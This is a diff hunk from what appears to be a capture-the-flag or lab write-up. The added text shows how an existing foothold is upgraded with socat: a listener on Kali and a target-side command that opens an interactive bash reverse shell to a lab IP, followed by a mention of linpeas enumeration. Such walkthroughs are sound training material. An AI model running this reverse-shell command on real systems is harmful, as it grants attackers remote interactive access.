@@ -36,5 +36,19 @@ and we get a shell:
 
 ![](attachments/Pasted%20image%2020251127124447.png)
 
+I upgraded the shell using `socat`:
 
+On Kali I ran this:
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+and on the target machine I ran:
+
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.126.129:4444
+```
+
+Then I ran `linpeas` on the target machine and after it finished and I was scanning through the results I found this:
 
